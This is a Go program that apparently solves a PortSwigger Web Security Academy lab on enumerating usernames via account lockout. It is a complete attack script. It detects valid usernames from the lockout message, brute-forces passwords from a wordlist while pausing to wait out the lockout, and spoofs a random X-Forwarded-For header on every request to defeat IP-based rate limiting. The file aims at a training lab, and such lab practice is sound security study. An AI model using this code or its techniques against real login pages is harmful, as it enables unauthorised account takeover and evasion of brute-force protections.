// https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock

package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	//"net/http/httputil"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	client, err := newClient()
	if err != nil {
		return err
	}

	u := "https://0a36004603222277c03025e3002100ca.web-security-academy.net"
	loginUrl := u + "/login"

	username, err := username(loginUrl, client)
	if err != nil {
		return err
	}

	fmt.Println("Sleep for 1 minute")
	time.Sleep(time.Duration(65 * time.Second))

	password, err := password(loginUrl, username, client)
	if err != nil {
		return err
	}

	fmt.Println("Username:", username)
	fmt.Println("Password:", password)
	return nil
}

func username(u string, client *http.Client) (string, error) {
	f, err := os.Open("usernames.txt")
	if err != nil {
		return "", err
	}
	defer f.Close()

	sc := bufio.NewScanner(f)
	for sc.Scan() {
		username := sc.Text()

		for i := 0; i < 5; i++ {
			fmt.Println(i)
			_, body, err := login(u, username, "123456", client)
			if err != nil {
				return "", err
			}
			if strings.Contains(body, "You have made too many incorrect login attempts") {
				return username, nil
			}
		}

	}
	return "", fmt.Errorf("username not found")
}

func password(u, username string, client *http.Client) (string, error) {
	f, err := os.Open("passwords.txt")
	if err != nil {
		return "", err
	}
	defer f.Close()

	sc := bufio.NewScanner(f)
	for sc.Scan() {
		password := sc.Text()
		ok, body, err := login(u, username, password, client)
		if err != nil {
			return "", err
		}
		if ok {
			return password, nil
		}
		if strings.Contains(body, "You have made too many incorrect login attempts") {
			fmt.Println("Sleep for 1 minute")
			time.Sleep(time.Duration(65 * time.Second))
		}
	}
	return "", fmt.Errorf("password not found")
}

func login(u, username, password string, client *http.Client) (bool, string, error) {
	fmt.Println("Login", username, password)
	postData := url.Values{"username": {username}, "password": {password}}
	req, err := http.NewRequest("POST", u, strings.NewReader(postData.Encode()))
	if err != nil {
		return false, "", err
	}
	req.Header.Add("X-Forwarded-For", randIP())

	//dump, err := httputil.DumpRequestOut(req, true)
	//if err != nil {
	//	return false, "", err
	//}
	//fmt.Printf("%q", dump)

	resp, err := client.Do(req)
	if err != nil {
		return false, "", err
	}
	defer resp.Body.Close()

	//fmt.Println(resp.Status)
	//fmt.Println(resp.Header)

	if resp.StatusCode/100 != 2 && resp.StatusCode/100 != 3 {
		return false, "", fmt.Errorf("%v", resp.Status)
	}

	if resp.StatusCode/100 == 3 {
		return true, "", nil
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false, "", err
	}
	b := string(body)

	if strings.Contains(b, "Your username") {
		return true, "", nil
	}
	fmt.Println(b)
	return false, b, nil
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	return &http.Client{Jar: jar}, nil
}

const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

func randString(n int) string {
	rand.Seed(time.Now().UnixNano())
	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func randIP() string {
	rand.Seed(time.Now().UnixNano())
	b := &strings.Builder{}
	b.WriteString(strconv.Itoa(rand.Intn(200)))
	b.WriteByte('.')
	b.WriteString(strconv.Itoa(rand.Intn(200)))
	b.WriteByte('.')
	b.WriteString(strconv.Itoa(rand.Intn(200)))
	b.WriteByte('.')
	b.WriteString(strconv.Itoa(rand.Intn(200)))
	return b.String()
}
